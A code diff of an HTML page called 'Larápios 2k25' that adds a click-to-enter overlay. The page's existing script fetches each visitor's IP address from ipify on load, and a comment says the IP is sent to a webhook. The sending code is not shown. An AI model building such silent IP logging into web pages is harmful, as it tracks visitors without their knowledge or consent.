@@ -9,6 +9,7 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
         $(document).ready(function () {
+            // Captura de IP e envio para Webhook
             $.getJSON('https://api.ipify.org?format=json', function (data) {
                 console.log(data);
                 var ip = data.ip;
@@ -31,16 +32,42 @@
                     }
                 });
             });
+
+            // Evento para ocultar a tela inicial e mostrar o conteúdo principal
+            $('#intro').click(function () {
+                $(this).fadeOut(); // Esconde o intro
+                $('#main-content').fadeIn(); // Mostra o conteúdo principal
+            });
         });
     </script>
+    <style>
+        #intro {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            cursor: pointer;
+        }
+
+        #main-content {
+            display: none; /* Oculta inicialmente */
+        }
+    </style>
 </head>
 <body>
     <div id="intro">
         <div class="intro-content">
-            <p>Larápios</p>
+            <p>Clique para entrar no mundo dos Larápios</p>
         </div>
     </div>
-    <div id="main-content" class="hidden">
+    <div id="main-content">
         <header>
             <h1 class="title">Larápios 2k25</h1>
         </header>
